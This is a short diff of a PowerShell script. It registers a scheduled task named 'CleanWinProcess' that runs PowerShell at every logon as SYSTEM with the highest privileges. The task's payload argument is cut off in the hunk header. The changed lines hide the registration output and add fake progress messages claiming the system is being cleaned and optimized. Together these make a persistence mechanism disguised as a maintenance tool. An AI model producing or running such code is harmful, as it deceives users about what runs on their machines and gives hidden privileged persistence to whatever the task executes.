@@ -12,4 +12,10 @@ $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Executio
 $trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Seconds 30)
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
-Register-ScheduledTask -TaskName "CleanWinProcess" -Action $action -Trigger $trigger -Principal $principal
+Register-ScheduledTask -TaskName "CleanWinProcess" -Action $action -Trigger $trigger -Principal $principal | out-null
+
+Write-Host "Fixing System Operator..." -ForegroundColor "Yellow"
+Start-Sleep -Seconds 20
+Write-Host "Cleanup Process..." -ForegroundColor "Yellow"
+Start-Sleep -Seconds 20
+Write-Host "System Optimized" -ForegroundColor "Green"
